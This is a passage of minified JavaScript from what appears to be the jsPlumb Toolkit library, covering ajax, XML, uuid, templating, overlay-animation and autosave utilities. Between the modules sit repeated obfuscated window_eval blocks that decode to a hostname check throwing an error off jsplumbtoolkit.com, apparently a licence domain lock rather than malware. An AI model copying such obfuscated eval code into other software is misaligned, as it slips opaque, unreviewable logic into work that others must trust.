4_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    var a = this;
    a.jsPlumbToolkitUtil = a.jsPlumbToolkitUtil || {};
    var b = a.jsPlumbToolkitUtil, c = function (a, b) {
        return function () {
            return a.apply(b, arguments)
        }
    };
    b.requestAnimationFrame = c(a.requestAnimationFrame || a.webkitRequestAnimationFrame || a.mozRequestAnimationFrame || a.oRequestAnimationFrame || a.msRequestAnimationFrame || function (b, c) {
        a.setTimeout(b, 10)
    }, a);
    b.ajax = function (a) {
        var b = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP"),
            c = a.type || "GET";
        if (b) {
            var d = "json" === a.dataType ? function (a) {
                return JSON.parse(a)
            } : function (a) {
                return a
            };
            b.open(c, a.url, !0);
            var e = a.headers || {};
            for (var f in e) b.setRequestHeader(f, e[f]);
            b.onreadystatechange = function () {
                4 === b.readyState && ("2" === ("" + b.status)[0] ? a.success(d(b.responseText)) : a.error && a.error(b.responseText, b.status))
            }, b.send(a.data ? JSON.stringify(a.data) : null)
        } else a.error && a.error("ajax not supported")
    }, b.debounce = function (a, b) {
        b = b || 150;
        var c = null;
        return function () {
            window.clearTimeout(c), c = window.setTimeout(a, b)
        }
    }, b.xml = {
        setNodeText: function (a, b) {
            a.text = b;
            try {
                a.textContent = b
            } catch (a) {
            }
        }, getNodeText: function (a) {
            return null != a ? a.text || a.textContent : ""
        }, getChild: function (a, b) {
            for (var c = null, d = 0; d < a.childNodes.length; d++) if (1 === a.childNodes[d].nodeType && a.childNodes[d].nodeName === b) {
                c = a.childNodes[d];
                break
            }
            return c
        }, getChildren: function (a, b) {
            for (var c = [], d = 0; d < a.childNodes.length; d++) 1 === a.childNodes[d].nodeType && a.childNodes[d].nodeName === b && c.push(a.childNodes[d]);
            return c
        }, xmlToString: function (a) {
            try {
                return (new XMLSerializer).serializeToString(a).replace(/\s*xmlns=\"http\:\/\/www.w3.org\/1999\/xhtml\"/g, "")
            } catch (b) {
                try {
                    return a.xml
                } catch (a) {
                    throw new Error("Cannot serialize XML " + a)
                }
            }
        }, createElement: function (a, b, c) {
            var d;
            try {
                d = new ActiveXObject("Microsoft.XMLDOM").createNode(1, a, "")
            } catch (b) {
                d = document.createElement(a)
            }
            if (c && jsPlumbToolkitUtil.xml.setNodeText(d, c), b) for (var e in b) d.setAttribute(e, b[e]);
            return d
        }
    }
}.call("undefined" != typeof window ? window : this), window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    "use strict";
    var a = this;
    a.jsPlumbToolkitUtil = a.jsPlumbToolkitUtil || {};
    var b = a.jsPlumbToolkitUtil, c = a.jsPlumbUtil;
    b.fastTrim = function (a) {
        for (var b = a.replace(/^\s\s*/, ""), c = /\s/, d = b.length; c.test(b.charAt(--d));) ;
        return b.slice(0, d + 1)
    }, b.uuid = function () {
        return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (a) {
            var b = 16 * Math.random() | 0;
            return ("x" == a ? b : 3 & b | 8).toString(16)
        })
    }, b.each = function (a, b) {
        a = null == a.length || "string" == typeof a ? [a] : a;
        for (var c = 0; c < a.length; c++) b(a[c])
    }, b.map = function (a, b) {
        for (var c = [], d = 0; d < a.length; d++) c.push(b(a[d]));
        return c
    }, b.populate = function (a, b) {
        var d = function (a) {
            var c = a.match(/(\${.*?})/g);
            if (null != c) for (var d = 0; d < c.length; d++) {
                var e = b[c[d].substring(2, c[d].length - 1)];
                e && (a = a.replace(c[d], e))
            }
            return a
        }, e = function (a) {
            if (null != a) {
                if (c.isString(a)) return d(a);
                if (c.isArray(a)) {
                    for (var b = [], f = 0; f < a.length; f++) b.push(e(a[f]));
                    return b
                }
                if (c.isObject(a)) {
                    var b = {};
                    for (var f in a) b[f] = e(a[f]);
                    return b
                }
                return a
            }
        };
        return e(a)
    }, b.mergeWithParents = function (a, b, d) {
        d = d || "parent";
        var e = function (a) {
            return a ? b[a] : null
        }, f = function (a) {
            return a ? e(a[d]) : null
        }, g = function (a, b) {
            if (null == a) return b;
            var d = c.merge(a, b);
            return g(f(a), d)
        }, h = function (a) {
            if (null == a) return {};
            if ("string" == typeof a) return e(a);
            if (a.length) {
                for (var b, c = !1, d = 0; !c && d < a.length;) b = h(a[d]), b ? c = !0 : d++;
                return b
            }
        }, i = h(a);
        return i ? g(f(i), i) : {}
    }, "undefined" != typeof exports && (exports.jsPlumbToolkitUtil = b)
}.call("undefined" != typeof window ? window : this), window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    var a = this, b = a.jsPlumb, c = a.jsPlumbUtil, d = {
        nodeTraverseStart: "startNodeTraversal",
        nodeTraverseEnd: "endNodeTraversal",
        start: "startOverlayAnimation",
        end: "endOverlayAnimation"
    }, e = {
        nodeTraversing: "jtk-animate-node-traversing",
        edgeTraversing: "jtk-animate-edge-traversing",
        nodeTraversable: "jtk-animate-node-traversable",
        edgeTraversable: "jtk-animate-edge-traversable"
    };
    b.Connection.prototype.animateOverlay = function (a, f) {
        var g = this, h = new c.EventGenerator, i = g.getConnector().getLength();
        f = f || {};
        var j, k, l, m = c.uuid(), n = !1 !== f.forwards, o = f.rate || 30, p = f.dwell || 250, q = f.speed || 100,
            r = i / q * 1e3, s = r / o, t = 1 / s * (n ? 1 : -1), u = !1 !== f.isFinal, v = n ? 0 : 1, w = v,
            x = function () {
                return n ? w >= 1 : w <= 0
            }, y = n ? g.source : g.target, z = n ? g.target : g.source;
        if ("string" == typeof a) l = [a, {location: v, id: m}]; else {
            var A = b.extend({}, a[1]);
            A.location = v, A.id = m, l = [a[0], A]
        }
        var B = function () {
            g.removeOverlay(m), window.clearInterval(j), u ? (b.addClass(z, e.nodeTraversing), window.setTimeout(function () {
                b.removeClass(z, e.nodeTraversing), g.removeClass(e.edgeTraversing), h.fire(d.end, g)
            }, p)) : (g.removeClass(e.edgeTraversing), h.fire(d.end, g))
        }, C = function () {
            w += t, x() ? B() : (k.loc = w, g.repaint())
        }, D = function () {
            h.fire(d.start, g), k = g.addOverlay(l), j = window.setInterval(C, o)
        }, E = function () {
            h.fire(d.nodeTraverseStart, {
                connection: g,
                element: y
            }), b.addClass(y, e.nodeTraversing), g.addClass(e.edgeTraversing), window.setTimeout(function () {
                b.removeClass(y, e.nodeTraversing), h.fire(d.nodeTraverseEnd, {connection: g, element: y}), D()
            }, p)
        };
        return f.previous ? f.previous.bind(d.end, E) : E(), h
    }
}.call("undefined" == typeof window ? this : window), window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    "use strict";
    var a = this, b = ["node", "port", "edge", "group"], c = ["Added", "Removed", "Updated", "Moved"], d = ["edge"],
        e = ["Source", "Target"], f = function (a, b, c, d) {
            for (var e = 0; e < a.length; e++) for (var f = 0; f < b.length; f++) c.bind(a[e] + b[f], d)
        };
    a.jsPlumbToolkitUtil.AutoSaver = function (a, g, h, i, j, k, l) {
        function m(a) {
            return function () {
                a && a.apply(a, arguments), l && l()
            }
        }

        var n = !1, o = function () {
            if (!n) {
                try {
                    k && k()
                } catch (a) {
                }
                a.save({url: g, success: m(i), error: m(j), headers: h})
            }
        };
        a.bind("dataLoadStart", function () {
            n = !0
        }), a.bind("dataLoadEnd", function () {
            n = !1
        }), a.bind("graphClearStart", function () {
            n = !0
        }), a.bind("graphCleared", function () {
            n = !1
        }), f(b, c, a, o), f(d, e, a, o)
    }, a.jsPlumbToolkitUtil.CatchAllEventHandler = function (a) {
        var g = function () {
            a.fire("dataUpdated")
        };
        f(b, c, a, g), f(d, e, a, g)
    }
}.call("undefined" != typeof window ? window : this),
